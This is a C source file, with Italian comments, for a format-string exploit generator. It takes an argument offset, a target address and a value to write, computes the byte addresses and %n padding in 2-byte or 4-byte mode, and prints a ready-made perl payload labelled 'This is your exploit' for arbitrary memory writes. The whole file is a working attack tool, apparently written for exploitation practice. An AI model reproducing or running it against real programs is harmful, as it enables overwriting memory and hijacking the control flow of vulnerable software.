/*
TODO: 
      2- Automatic research of how many words to first argoument

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc ,char* argv[])
{
  unsigned int what, minus , a_1 , a_2 , a_3 , a_4, modality;  
  unsigned int res[4];
  int off1,off2,off3,off4;
  unsigned int start_1[4],start_2[4],start_3[4],start_4[4], what_b[4]; 
  
  if( argc < 3 ) 
    { 
     printf("Usage: %s < offset to the first parameter > <address of first byte you want to overwrite> <which address you want to paste> < modality > <padding> \n", argv[0]); //[TODO] small parser   
     exit(0);
    }
  
  modality = strtoul(argv[4],NULL,10);
   
  if( modality != 2 && modality != 4 )
    {
     puts("Wrong modality mode! Valid modality are 2 bytes or 4 bytes\n");
     exit(0);
    }  

  if( modality == 4 )
  {
  	off1 = atoi(argv[1]);
  	off2 = off1 + 1;
  	off3 = off2 + 1;
  	off4 = off3 + 1; 

  	a_1  = strtoul(argv[2], NULL, 0);  //calcolo dei 3 byte successivi alla base data 
  	a_2  = a_1 +0x00000001;
  	a_3  = a_2 +0x00000001;
  	a_4  = a_3 +0x00000001;
  
  	what   = strtoul(argv[3], NULL, 0); //salvo in hex l'indirizzo mio che voglio "incollare" 
   
  	// spezzo nelle singole cifre esadecimali gli indirizzi di partenza

  	start_1[0] =   a_1 & 0x000000ff ;
  	start_1[1] = ( a_1 & 0x0000ff00 ) >> 8;
  	start_1[2] = ( a_1 & 0x00ff0000 ) >> 16;
  	start_1[3] = ( a_1 & 0xff000000 ) >> 24;     
  
  	start_2[0] =   a_2 & 0x000000ff ;
  	start_2[1] = ( a_2 & 0x0000ff00 ) >> 8;
  	start_2[2] = ( a_2 & 0x00ff0000 ) >> 16;
  	start_2[3] = ( a_2 & 0xff000000 ) >> 24;  
 
  	start_3[0] =   a_3 & 0x000000ff ;
  	start_3[1] = ( a_3 & 0x0000ff00 ) >> 8;
  	start_3[2] = ( a_3 & 0x00ff0000 ) >> 16;
  	start_3[3] = ( a_3 & 0xff000000 ) >> 24;  

  	start_4[0] =   a_4  & 0x000000ff ;
  	start_4[1] = ( a_4  & 0x0000ff00 ) >> 8;
  	start_4[2] = ( a_4  & 0x00ff0000 ) >> 16;
  	start_4[3] = ( a_4  & 0xff000000 ) >> 24;  

  	//calcolo dell'ultima cifra dell'indirizzo in cui scrivo  
 
  	what_b[3] = ( what & 0xff000000 ) >> 24;
  	what_b[2] = ( what & 0x00ff0000 ) >> 16;
  	what_b[1] = ( what & 0x0000ff00 ) >> 8;
  	what_b[0] =   what & 0x000000ff ;
  
  	int i; // indicatore byte trattato
  	minus = 0x00000010; // 16 in decimale ( è il numero di byte già scritti prima di arrivare alla format string )
  	for( i=0 ; i<4; i++ )
           {
             if( (what_b[i] - 0x00000004) > minus )
         	res[i] = what_b[i] - minus ; // tolgo 16, la lunghezza dei 4 indirizzi da sovrascrivere che corrispondono a byte già contati per il %n
      	     else
         	res[i] = ( what_b[i] + 0x00000100 ) - minus ; 
 
     	    minus = what_b[i];  
     }
  puts("\nThis is your exploit:\n");

  printf("$(perl -e 'print \"\\x%02x\\x%02x\\x%02x\\x%02x\" . \"\\x%02x\\x%02x\\x%02x\\x%02x\" . \"\\x%02x\\x%02x\\x%02x\\x%02x\" . \"\\x%02x\\x%02x\\x%02x\\x%02x\" . \"%%%02dx%%%d$n\" . \"%%%02dx%%%d$n\" . \"%%%02dx%%%d$n\" . \"%%%02dx%%%d$n\" ')", start_1[0] , start_1[1] , start_1[2] , start_1[3], start_2[0] , start_2[1] , start_2[2] , start_2[3] , start_3[0] , start_3[1] , start_3[2] , start_3[3] , start_4[0] , start_4[1] , start_4[2] , start_4[3] , res[0] , off1 , res[1], off2 , res[2] , off3 , res[3] , off4 );
 puts("\n\n");
} 

 if( modality == 2 )
  {
  	off1 = atoi(argv[1]);
  	off2 = off1 + 1;
  	
  	a_1  = strtoul(argv[2], NULL, 0);  
  	a_2  = a_1 +0x00000002; //calcolo dell'indirizzo del 3° byte 
  	
  	what   = strtoul(argv[3], NULL, 0); //salvo in hex l'indirizzo mio che voglio "incollare" 
   
  	// spezzo nelle singole cifre esadecimali gli indirizzi di partenza

  	start_1[0] =   a_1 & 0x000000ff ;
  	start_1[1] = ( a_1 & 0x0000ff00 ) >> 8;
  	start_1[2] = ( a_1 & 0x00ff0000 ) >> 16;
  	start_1[3] = ( a_1 & 0xff000000 ) >> 24;     
  
  	start_2[0] =   a_2 & 0x000000ff ;
  	start_2[1] = ( a_2 & 0x0000ff00 ) >> 8;
  	start_2[2] = ( a_2 & 0x00ff0000 ) >> 16;
  	start_2[3] = ( a_2 & 0xff000000 ) >> 24;  
 
  	what_b[1] = ( what & 0xffff0000 ) >> 16;
  	what_b[0] =   what & 0x0000ffff ;
  
  	int i; // indicatore byte trattato
  	minus = 0x00000008; 

  	for( i=0 ; i<2; i++ )
           {
             if( (what_b[i] - 0x00000001) > minus )
         	res[i] = what_b[i] - minus ;
      	     else
         	{  
                  what_b[i] = what_b[i] + 0x00010000;
 	          res[i] = what_b[i] - minus ;
                } 
     	    minus = what_b[i];  
          }

  puts("\nThis is your exploit:\n");

  printf("$(perl -e 'print \"\\x%02x\\x%02x\\x%02x\\x%02x\" . \"\\x%02x\\x%02x\\x%02x\\x%02x\" . \"%%%02dx%%%d$n\" . \"%%%02dx%%%d$n\" ')" , start_1[0] , start_1[1] , start_1[2] , start_1[3], start_2[0] , start_2[1] , start_2[2] , start_2[3] , res[0] , off1 , res[1], off2 );
 puts("\n\n");
} 

}
